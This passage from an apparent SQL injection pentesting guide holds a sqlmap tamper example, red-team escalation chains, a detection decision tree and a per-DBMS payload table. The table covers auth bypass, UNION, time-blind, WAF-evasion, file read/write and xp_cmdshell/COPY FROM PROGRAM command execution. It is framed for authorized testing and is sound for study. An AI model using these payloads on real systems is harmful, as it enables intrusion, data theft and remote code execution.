# tamper scripts for WAFs (try minimal first):
sqlmap -r req.txt --tamper=space2comment,between,charencode --random-agent
```
- **Quality gate:** never submit "sqlmap flagged it." Reproduce by hand: the **context**, the **DBMS**, and a **controlled query change** (version/true-false/delay/DNS). Use sqlmap to *confirm and characterize*, not as the whole report. See `poc/sqlmap_cheat.md`.
- **Risk discipline:** `--risk 3` enables **stacked-query writes** (it may `UPDATE`/`INSERT`) — do **not** use it on production. `--dump`/`--dump-all` exfiltrates real data — avoid on bounty; use `--current-user`/`--tables`/one-column reads for proof.

**Stealth / OPSEC (authorized engagements):**
```
□ Blind/time extraction is REQUEST-HEAVY (charset × length). Pace it (jitter + low concurrency); prefer binary search
  (~log2(charset) per char) and boolean/UNION over time when available. A time-blind dump is extremely loud.
□ Error-based probing generates DB errors (logged/alerted). Minimize once you've fingerprinted.
□ Auth-bypass attempts can lock out accounts (failed-login counters). Test against YOUR account.
□ OOB callbacks reveal your infra — use a per-target Collaborator; egress itself may alert a SOC.
□ Stacked writes / xp_cmdshell are high-signal and high-risk — benign single command, no persistence (§25).
```

**Red-team angles:**
```
□ SQLi → DB dump (creds/hashes) → offline crack → credential reuse → lateral (authorized).
□ SQLi → file read (.env/config/source) → cloud/DB creds → SSRF/recon kits → broader foothold.
□ SQLi → xp_cmdshell / COPY…FROM PROGRAM → OS RCE on the DB host → internal pivot.
□ MSSQL linked servers (OPENQUERY / EXECUTE … AT) → query/RCE on OTHER databases & hosts (§17).
□ Second-order: poison a stored field consumed by an admin report/job running at higher privilege (§18).
□ Chain: SQLi-leaked internal hostnames/connection strings → SSRF / internal service access.
```

---

# Appendix A — SQLi Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                       SQL INJECTION WORKFLOW                      │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: every param reaching SQL (URL/body/JSON/headers/cookie) │
│    + login/search/sort(ORDER BY)/filter/paginate/export   §3      │
│ 1. BASELINE ★ : normal value, then ' " ) , arithmetic 2-1 →       │
│    error? boolean-diff? time? union-able? silent? STRING vs       │
│    NUMERIC vs IDENTIFIER context                          §4/§5   │
│ 2. DETECT (in order):                                            │
│    break query §5 · error+DBMS fingerprint §6 · BOOLEAN §7 ·     │
│    TIME §8 · UNION (cols+type) §9 · OOB §10 · STACKED §11        │
│ 3. IMPACT ⭐ :                                                     │
│    RCE  xp_cmdshell / COPY..FROM PROGRAM / UDF ....... §16 ⭐⭐⭐  │
│    AUTH BYPASS  admin'-- -  / ' OR 1=1 LIMIT 1 ...... §12 ⭐⭐⭐  │
│    DUMP  schema→tables→ONE benign row ............... §13 ⭐⭐    │
│    FILE READ LOAD_FILE / pg_read_file / OPENROWSET .. §14 ⭐     │
│    FILE WRITE → webshell (INTO OUTFILE / COPY TO) ... §15 ⭐     │
│    PRIVESC / linked-server lateral ................. §17        │
│    SECOND-ORDER (stored → consumer) ................ §18        │
│ 4. EVADE (if WAF): /*!UNION*/ · /**/space · hex/CHAR ·          │
│    time-over-boolean · identifier slot · second-order  §19      │
│ 5. VALIDATE → REPORT:                                           │
│    FP filter §22 ('  500 ≠ injection; tool-only; slow≠time)     │
│    CVSS + CWE-89 (+287/78) §23                                  │
│    SAFE PoC: version()+1 benign row, no mass dump, no           │
│    destructive writes, benign whoami only §25                   │
│    title = impact, dedup §26                                    │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — SQLi Decision Tree

```
Injected ' " ) / arithmetic 2-1 into the param (§4/§5) →
│
├─ A SQL error names the engine?  → ERROR-BASED. fingerprint DBMS (§6); try extractvalue/CAST/CONVERT extraction.
│
├─ id=2-1 returns the id=1 row?   → NUMERIC context. inject directly (OR 1=1 / UNION / SLEEP) (§5.2).
│
├─ ' OR '1'='1 widens, ' AND '1'='2 empties? → STRING context confirmed → boolean oracle (§7).
│
├─ AND 1=1 vs AND 1=2 give DIFFERENT responses? → BOOLEAN BLIND. extract version/db (§7). HIGH ⭐
│
├─ AND SLEEP(5) delays (SLEEP(0) doesn't), repeatably? → TIME BLIND (+DBMS). extract via conditional sleep (§8). HIGH
│
├─ Results reflected & ORDER BY N errors + UNION SELECT shows a marker? → UNION. version→schema→1 row (§9/§13). HIGH ⭐⭐
│
├─ Nothing in-band, time too slow? → OOB. DNS/HTTP callback carrying database() (xp_dirtree/UTL_INADDR/COPY) (§10).
│
├─ '; WAITFOR DELAY / pg_sleep runs? → STACKED (MSSQL/PG). → xp_cmdshell / COPY..FROM PROGRAM = RCE (§11/§16). CRITICAL ⭐⭐⭐
│
├─ A login errors on ' ?  → AUTH BYPASS: admin'-- - / ' OR 1=1 LIMIT 1. admin→CRITICAL (§12) ⭐⭐⭐
│
├─ ?sort= / ?order= / a column name? → IDENTIFIER context: index / CASE / subquery-SLEEP (no quotes) (§5.4).
│
├─ Parameterized front-end but value STORED & reused later? → SECOND-ORDER: plant time/OOB, trigger consumer (§18).
│
├─ Payload blocked by a WAF? → evade: /*!UNION*/ · /**/ space · hex/CHAR · time-over-boolean (§19), retry detection.
│
└─ Only a reflected SQL error / a lone 500? → NOT proven. Show the QUERY changed first (§22).

ALWAYS: prove the DB did your bidding (rows / true-false / delay / DNS / version / whoami), once & benignly, then STOP (§25).
```

---

# Appendix C — Per-DBMS Syntax & Function Reference

```
                 MySQL/MariaDB        PostgreSQL           MSSQL                  Oracle                 SQLite
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
version          @@version /VERSION() version()            @@version              (SELECT banner FROM    sqlite_version()
                                                                                   v$version WHERE rownum=1)
current user     user() current_user  current_user         SYSTEM_USER USER_NAME() (SELECT user FROM dual) —
current db       database()           current_database()   DB_NAME()              (SELECT ora_database_name —
                                                                                   FROM dual)
comment          -- -  #  /*…*/ /*!*/ -- /*…*/             -- /*…*/               -- /*…*/               -- /*…*/
string concat    CONCAT(a,b)          a||b                 a+b                    a||b                   a||b
substring        SUBSTRING/MID(s,p,n) SUBSTR(s,p,n)        SUBSTRING(s,p,n)       SUBSTR(s,p,n)          SUBSTR(s,p,n)
ascii of char    ASCII(c)             ASCII(c)             ASCII/UNICODE(c)       ASCII(c)               UNICODE(c)
char from code   CHAR(65) / 0x41      CHR(65)              CHAR(65)               CHR(65)                CHAR(65)
length           LENGTH() CHAR_LENGTH LENGTH()             LEN()                  LENGTH()               LENGTH()
sleep (time)     SLEEP(5)             pg_sleep(5)          WAITFOR DELAY '0:0:5'  DBMS_PIPE.RECEIVE_     (none)
                                                                                   MESSAGE(('a'),5)
aggregate→1 cell GROUP_CONCAT(x)      string_agg(x,',')    STRING_AGG(x,',')      LISTAGG(x,',')         group_concat(x)
list tables      information_schema   information_schema   information_schema /   all_tables /           sqlite_master
                 .tables              .tables              sys.tables             user_tables            (type='table')
list columns     information_schema   information_schema   information_schema /   all_tab_columns        (parse sqlite_master.sql)
                 .columns             .columns             sys.columns
need FROM dual?  no                   no                   no                     YES (FROM dual)        no
stacked queries  usually NO           YES                  YES                    limited (PL/SQL)       sometimes
read file        LOAD_FILE('p')       pg_read_file('p') /  OPENROWSET(BULK 'p',   UTL_FILE / ext tables  (none)
                                      COPY t FROM 'p'      SINGLE_CLOB)
write file       INTO OUTFILE/DUMPFILE COPY (…) TO 'p'     OLE (sp_OACreate)      UTL_FILE               (none)
OS command (RCE) UDF lib_mysqludf_sys COPY…FROM PROGRAM    xp_cmdshell / sp_OA /  DBMS_SCHEDULER / Java  (none)
                 (high bar)           (superuser)          CLR / linked srv
error-extraction extractvalue/        CAST text→int        CONVERT(int,subq) /    UTL_INADDR /           (limited)
                 updatexml/floor      ::int                error msg              CTXSYS.DRITHSX.SN
OOB              LOAD_FILE UNC (Win)  COPY…TO PROGRAM /     xp_dirtree/xp_fileexist UTL_HTTP/UTL_INADDR/  (none)
                                      dblink               (DNS/SMB)              DBMS_LDAP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
URL-ENCODE the payload when sending:  ' %27   " %22   space %20   # %23   -- %2d%2d   ; %3b   ( %28 ) %29
NO-QUOTE strings:  MySQL 0x61646d696e = 'admin' ·  CHAR/CHR(...) on all ·  Oracle/PG/SQLite CHR(65)||CHR(66)
```

---

# Appendix D — References & Further Reading

**Always-on (start here):**
- **PortSwigger Web Security Academy — SQL injection** (topic + labs): https://portswigger.net/web-security/sql-injection
- **PortSwigger — SQL injection cheat sheet:** https://portswigger.net/web-security/sql-injection/cheat-sheet
- **HackTricks — SQL injection** (+ per-DBMS pages): https://book.hacktricks.xyz/pentesting-web/sql-injection
- **PayloadsAllTheThings — SQL Injection:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- **OWASP** — SQL Injection · **WSTG** Testing for SQL Injection (WSTG-INPV-05) · **SQL Injection Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **PentesterLab** — "From SQL Injection to Shell" I/II + the SQLi badges (hands-on)

**Tools:**
- **sqlmap** (the reference exploiter): https://sqlmap.org/ · https://github.com/sqlmapproject/sqlmap · **ghauri** (fast blind alternative) · **GTFOBins** + HackTricks DBMS pages for per-engine RCE (xp_cmdshell / COPY … FROM PROGRAM / UDF)

**Standards & scoring:**
- **CWE-89** (SQL Injection) · **CWE-74** (injection) · **CWE-287** (auth bypass) · **CWE-78** (OS command via SQL→RCE): https://cwe.mitre.org/data/definitions/89.html
- **CVSS 3.1** — SQLi is typically `AC:L` and reaches `C:H/I:H/A:H` (full DB compromise), rising to `S:C` when it pivots to the OS / other tenants (see §23).

**Notable real-world cases / CVEs:**
- **MOVEit Transfer** CVE-2023-34362 (Cl0p mass exploitation) · **Accellion FTA** CVE-2021-27101 · **Drupalgeddon** CVE-2014-3704 · **Joomla!** CVE-2017-8917. Pattern: *one injectable parameter → mass data theft / RCE at scale.*

---

> **Final reminder — the one rule that pays:** *SQL injection means you are co-authoring the query — the only thing that matters is whether the database did something different because of your input.* Nail the **context** (string/numeric/identifier), **fingerprint the engine**, pick the **one channel** the target gives you (error → UNION → boolean → time → OOB), then prove the impact — **run a command** (`xp_cmdshell whoami`), **log in as admin** (`admin'-- -`), **read the DB** (`UNION SELECT @@version`) — **once, benignly,** with `version()` + a single row instead of a full dump, and stop. That's how "a quote threw an error" becomes the Critical it's worth. Authorized targets only — and never run a destructive write.
